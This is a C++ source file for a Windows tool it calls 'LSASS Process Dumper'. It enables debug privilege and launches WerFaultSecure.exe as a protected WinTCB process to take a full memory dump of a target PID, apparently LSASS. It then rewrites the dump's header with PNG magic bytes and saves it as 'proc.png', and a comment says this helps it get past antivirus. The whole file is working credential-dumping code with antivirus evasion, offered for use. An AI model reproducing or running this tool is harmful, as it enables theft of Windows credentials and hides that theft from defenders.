#include <windows.h>
#include <winternl.h>
#include <string>
#include <sstream>
#include <iostream>
#include <thread>
#include "PPLHelp.h"

#pragma comment(lib, "ntdll.lib")

// If not already defined
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Define the NtResumeProcess function type
typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE ProcessHandle);

// Renamed structures to avoid conflicts
typedef struct _MY_SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    LONG Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} MY_SYSTEM_THREAD_INFORMATION;

typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    MY_SYSTEM_THREAD_INFORMATION Threads[1];
} MY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

// Convert HANDLE to decimal string
std::wstring HandleToDecimal(HANDLE h)
{
    std::wstringstream ss;
    ss << reinterpret_cast<UINT_PTR>(h);
    return ss.str();
}

bool EnableDebugPrivilege()
{
    HANDLE hToken = nullptr;
    TOKEN_PRIVILEGES tp = {};
    LUID luid;

    // Open the current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::wcerr << L"OpenProcessToken failed: " << GetLastError() << L"\n";
        return false;
    }

    // Lookup the LUID for SeDebugPrivilege
    if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid))
    {
        std::wcerr << L"LookupPrivilegeValue failed: " << GetLastError() << L"\n";
        CloseHandle(hToken);
        return false;
    }

    // Enable the privilege
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr))
    {
        std::wcerr << L"AdjustTokenPrivileges failed: " << GetLastError() << L"\n";
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);

    // Check for success
    if (GetLastError() == ERROR_SUCCESS)
    {
        std::wcout << L"SeDebugPrivilege enabled successfully.\n";
        return true;
    }
    else
    {
        std::wcerr << L"AdjustTokenPrivileges reported error: " << GetLastError() << L"\n";
        return false;
    }
}
// Get main thread ID of a process using NtQuerySystemInformation
DWORD GetMainThreadId(DWORD pid)
{
    ULONG bufferSize = 0x10000;
    PVOID buffer = nullptr;
    NTSTATUS status;
    PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    do {
        buffer = VirtualAlloc(nullptr, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return 0;

        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, nullptr);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            VirtualFree(buffer, 0, MEM_RELEASE);
            bufferSize *= 2;
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 0;
    }

    DWORD mainThreadId = 0;
    LARGE_INTEGER earliestCreateTime = { 0x7FFFFFFFFFFFFFFF };
    auto spi = (MY_SYSTEM_PROCESS_INFORMATION*)buffer;

    while (true) {
        if ((DWORD)(ULONG_PTR)spi->UniqueProcessId == pid) 
        {
            if (spi->NumberOfThreads > 0)
            {
                mainThreadId = (DWORD)(ULONG_PTR)spi->Threads[0].ClientId.UniqueThread;
            }
            break;
        }

        if (spi->NextEntryOffset == 0) break;
        spi = (MY_SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    return mainThreadId;
}

void ResumeProcessLoop(DWORD pid) 
{
    // Load ntdll.dll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to load ntdll.dll\n";
        return;
    }
    // Get the address of NtResumeProcess
    pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(hNtdll, "NtResumeProcess");
    if (!NtResumeProcess) 
    {
        std::cerr << "Failed to get NtResumeProcess address\n";
        return;
    }
    // Open the process with minimal required access
    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (!hProcess) 
    {
        std::cerr << "Failed to open process with PROCESS_SUSPEND_RESUME. Error: " << GetLastError() << "\n";
        return;
    }
    // Loop 10 times and call NtResumeProcess
    for (int i = 0; i < 10; ++i)
    {
        Sleep(1000); // Optional: small delay between calls
        NTSTATUS status = NtResumeProcess(hProcess);
        if (status != 0) {
            std::cerr << "NtResumeProcess failed at iteration " << i << " with status: 0x" << std::hex << status << "\n";
        }
        else 
        {
            std::cout << "Iteration " << i << ": Process resumed successfully.\n";
            break;
        }
        // end loop
    }

    CloseHandle(hProcess);
}

BOOL DumpRun(std::wstring werPath, DWORD targetPID, DWORD targetTID)
{
    // 1. Prepare SECURITY_ATTRIBUTES for inheritable handles
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = nullptr;

    // 2. Create the output files for the dumps
    HANDLE hDump = CreateFileW(L"proc.png", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    HANDLE hEncDump = CreateFileW(L"proce.png", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDump == INVALID_HANDLE_VALUE || hEncDump == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"Failed to create dump files: " << GetLastError() << std::endl;
        return 0;
    }
    // 3. Create the cancellation event
    HANDLE hCancel = CreateEventW(&sa, TRUE, FALSE, nullptr);
    if (!hCancel)
    {
        std::wcerr << L"Failed to create cancel event: " << GetLastError() << std::endl;
        CloseHandle(hDump);
        CloseHandle(hEncDump);
        return 0;
    }

    //
    std::wstringstream cmd;
    cmd << werPath
        << L" /h"
        << L" /pid " << targetPID
        << L" /tid " << targetTID
        << L" /file " << HandleToDecimal(hDump)
        << L" /encfile " << HandleToDecimal(hEncDump)
        << L" /cancel " << HandleToDecimal(hCancel)
        << L" /type 268310"; // dump full
    std::wstring commandLine = cmd.str();
    PPLProcessCreator creator;

    // Create a thread to run ResumeProcessLoop
    std::thread resumeThread(ResumeProcessLoop, targetPID);
    // Detach the thread so it runs independently
    resumeThread.detach();

    //0 = WinTCB
    if (!creator.CreatePPLProcess(0, commandLine))
    {
        std::wcerr << L"Failed to create PPL process." << std::endl;
        CloseHandle(hDump);
        CloseHandle(hEncDump);
        CloseHandle(hCancel);
        return 0;
    }

    // Define the bytes to write: PNG magic header
    //Original file Should be 0x504d444d ("MDMP") 
    //BYTE origMagic[4] = {0x4D, 0x44, 0x4D, 0x50};  "MDMP"
    BYTE data[4] = { 0x89, 0x50, 0x4E, 0x47 }; //PNG magic header
    //change magic header to better run with AVs compatible

    // Move the file pointer to the beginning of the file
    DWORD bytesWritten;
    SetFilePointer(hDump, 0, NULL, FILE_BEGIN);
    if (!WriteFile(hDump, data, sizeof(data), &bytesWritten, NULL))
    {
        std::cerr << "Error writing to file: " << GetLastError() << std::endl;
    }
    CloseHandle(hDump);
    CloseHandle(hEncDump);
    CloseHandle(hCancel);
    // Delete the useless enc file
    if (DeleteFileW(L"proce.png")) 
    {
        std::cout << "File deleted successfully." << std::endl;
    }
    else 
    {
        std::cerr << "Error deleting file: " << GetLastError() << std::endl;
    }

    return 1;
}

int wmain(int argc, wchar_t* argv[])
{
    std::wcout << L"\nLSASS Process Dumper\n"
        << L"  Two Seven One Three: x.com/TwoSevenOneT\n"
        << L"==================================================\n\n";
    
    if (argc != 3)
    {
        std::wcout << L"Usage:\n"
            << L"  WSASS.exe <PathToWerFaultSecure.exe> <TargetPID>\n\n"
            << L"Example:\n"
            << L"  WSASS.exe \"C:\\Windows\\System32\\WerFaultSecure.exe\" 1234\n";
        return 0;
    }

    // Parse arguments
    std::wstring werPath = argv[1];
    DWORD targetPid = _wtoi(argv[2]);
    if (targetPid == 0)
    {
        std::wcerr << L"Invalid PID: " << argv[2] << L"\n";
        return 0;
    }
    //
    if (!EnableDebugPrivilege())
    {
        std::wcerr << L"Failed to enable debug privilege.\n";
        return 0;
    }

    // Get main thread ID
    DWORD targetTid = GetMainThreadId(targetPid);
    if (targetTid == 0)
    {
        std::wcerr << L"Failed to find main thread for PID " << targetPid << L"\n";
        return 0;
    }
    if (DumpRun(werPath, targetPid, targetTid) == 0)
    {
        std::cerr << "Process dump failed" << std::endl;
    }
    else
    {
        std::wcout << L"Process dump successfully" << std::endl;
    }

    return 1;
}
